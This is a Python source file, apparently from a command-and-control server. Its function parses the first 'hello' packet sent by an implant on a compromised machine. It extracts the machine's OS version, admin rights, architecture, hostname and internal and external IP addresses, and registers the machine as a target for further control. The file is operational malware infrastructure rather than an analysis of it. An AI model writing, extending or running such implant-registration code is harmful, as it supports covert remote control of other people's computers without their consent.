import re
import json
import struct

import navi

from lib import logging
from core.state import targets, Target


def parse_hello_packet(instance_id, data, address='UNK'):
    """
    The first packet the implant sends.
    """

    logging.success(f'Recieved Hello packet from {instance_id}')

    ##
    ## Unpack the initial header
    ##
    ( os_major_version, os_minor_version, is_admin, is_64 ) = struct.unpack(
            '!IIBB', 
            data[:10]
    );

    ##
    ## Unpack string
    ##
    (
        hostname,
        internal_ips
    ) = data[10:].decode().split( '\t' );

    ##
    ## Set architecture
    ##
    if is_64 != False: 
        arch = "x64" 
    else: 
        arch = "x86"

    try:
        internal_ips = ",".join(re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", internal_ips))
    except:
        None

    ##
    ## Json Data
    ##
    target = {
        "implant_id": instance_id,
        "os_version": '{}.{}'.format( os_major_version, os_minor_version ),
        "machine_name": hostname,
        "software_id": 4,
        "interval": 0,
        "architecture": arch,
        "source_address": internal_ips, # set me!
        "wan_address": address
    }

    tgt = json.loads(navi.midna.new_target(target))
    
    targets[tgt["implant_id"]] = Target(
        tgt["id"],
        tgt["interval"]
    )
    return target
